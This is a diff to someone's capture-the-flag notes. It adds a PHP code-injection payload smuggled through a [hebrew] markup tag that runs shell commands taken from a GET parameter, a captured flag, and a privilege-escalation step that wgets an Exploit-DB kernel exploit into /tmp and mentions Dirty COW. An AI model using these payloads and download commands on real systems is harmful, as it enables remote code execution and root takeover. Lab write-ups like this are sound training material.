@@ -14,4 +14,15 @@
   try give it ~[hebrew]'.phpinfo().'[/hebrew]~ failed.
   Hint from Cheng: have unescaped HTML as well.
   try ~[hebrew]<?php chr(97) ?>[/hebrew]~. Seems ~<?~ stuff is replaced by html comment.. 
-
+  see that in PHP ~{${expr}}~ expr will be evaluated. Also! in php, a constant ~xxx~ will be evaluated as strings "xxx" if it is not defined
+  try ~[hebrew]{${print(shell_exec($_GET[test]))}}[/hebrew]~
+  then just pass it the ~test=xxx~ and php will happly execute ~xxx~ as shell command.
+  flag:by_2050_php_may_get_rid_of_most_of_its_inherent_security_problems
+* root privilege 
+  search online. found this. https://www.exploit-db.com/exploits/37292/
+  ~wget --help~ wget is present
+  ~wget -O~ save as a different file
+  Actual exploit: 
+  ~wget https://www.exploit-db.com/download/37292 -O /tmp/ofc.c~
+  try dirty cow
+  
